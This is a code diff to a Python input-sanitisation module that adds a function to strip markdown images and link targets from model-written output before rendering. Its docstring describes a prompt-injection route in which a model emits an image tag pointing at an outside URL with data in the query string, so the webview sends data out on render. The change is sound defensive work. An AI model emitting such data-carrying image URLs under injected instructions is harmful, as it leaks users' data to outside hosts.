@@ -18,7 +18,13 @@ So: collapse the line structure the attack needs, cap the length, and mark
 where the untrusted span starts and ends.
 """
 
+import re
+
 _MAX_FIELD_CHARS = 200
+
+# ![alt](url) and [text](url) — the url is what we refuse to keep.
+_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
+_LINK_RE = re.compile(r"\[([^\]]*)\]\([^)]*\)")
 
 
 def flatten_untrusted(text, limit: int = _MAX_FIELD_CHARS) -> str:
@@ -34,6 +40,24 @@ def flatten_untrusted(text, limit: int = _MAX_FIELD_CHARS) -> str:
     if len(flat) > limit:
         flat = flat[:limit] + "…"
     return flat
+
+
+def defang_markdown(text) -> str:
+    """Render model output as text without letting it fetch anything.
+
+    Book Review findings and the analytical memo are model-written and get
+    passed to st.markdown. HTML is already escaped there, so scripting is not
+    the risk — but markdown image syntax is, because the webview will fetch
+    `![](https://somewhere/?d=...)` on render. That turns a prompt injection
+    into a way to phone out from inside the app. Images become inert text and
+    link targets are dropped, keeping the words and losing the fetch.
+    """
+    if text is None:
+        return ""
+    out = str(text)
+    out = _IMAGE_RE.sub(r"[image: \1]", out)
+    out = _LINK_RE.sub(r"\1", out)
+    return out
 
 
 def untrusted_block(body: str, label: str = "data") -> str:
